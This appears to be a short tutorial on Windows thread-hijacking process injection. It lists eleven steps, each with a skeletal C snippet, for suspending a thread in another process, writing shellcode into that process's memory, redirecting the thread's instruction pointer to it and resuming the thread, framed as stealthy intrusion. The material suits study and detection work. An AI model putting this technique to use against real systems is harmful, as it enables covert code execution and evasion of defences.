# Theory
>  It requires precision, understanding of the context, and an imperceptible touch, much like a master pickpocket blending into a crowd, leaving no trace of intrusion.

### Windows API Functions

<p>We can leverage the underlying Windows OS with it's own dev tools: Windows API Functions.</p>
<p>We need to find the process, a thread it owns, and instruct the thread to point at code we wrote in the process' address space.</p>
<p>These are the functions to do so.</p>

```c
GetThreadContext() && WriteProcessMemory() && SetThreadContext();
```

### Process

###### We will define strctures on the fly

<p><b>Step 1.</b> Find Process ID of target process.</p>
<p><b>Step 2.</b> Find Thread ID of thread the process owns.</p>
<p><b>Step 3.</b> Open the process.</p>
<p><b>Step 4.</b> Open the thread.</p>
<p><b>Step 5.</b> Suspend target thread.</p>
<p><b>Step 6.</b> Get the thread context.</p>
<p><b>Step 7.</b> Allocate memory to be written to within the target space.</p>
<p><b>Step 8.</b> Write shellcode to allocate memory in target space.</p>
<p><b>Step 9.</b> Set a pointer to the memory for execution.</p>
<p><b>Step 10.</b> Set thread context with pointer to shellcode.</p>
<p><b>Step 11.</b> Resume thread.</p>

### Action

```c
 // 1 GET PROCESS ID
CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS);
Process32FirstW(Snapshot);
processId = pe.th32ProcessID;
```
```c
// 2 GET THREAD ID
CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD);
Thread32First(Snapshot);
threadId = te32.th32ThreadID;
```
```c
// 3 OPEN PROCESS
OpenProcess(pid)
```
```c
// 4 OPEN THREAD
OpenThread(tid)
```
```c
// 5 SUSPEND THREAD
SuspendThread(Thread);
```
```c
// 6 GET THREAD CONTEXT
GetThreadContext(Thread);
```
```c
// 7 ALLOCATE MEMORY
VirtualAllocEx(Process, ShellcodeSize)
```
```c
// 8 WRITE SHELLCODE TO ALLOCATED MEMORY
WriteProcessMemory(Process, AllocatedMemory)
```
```c
// 9 POINT TO SHELLCODE TO EXECUTE
ctx.Rip = (DWORD64)AllocatedMemory;
```
```c
// 10 FORCE THREAD POINT TO SHELLCODE
SetThreadContext(Thread);
```
```c
// 11 RESUME THREAD
ResumeThread(Thread);
```
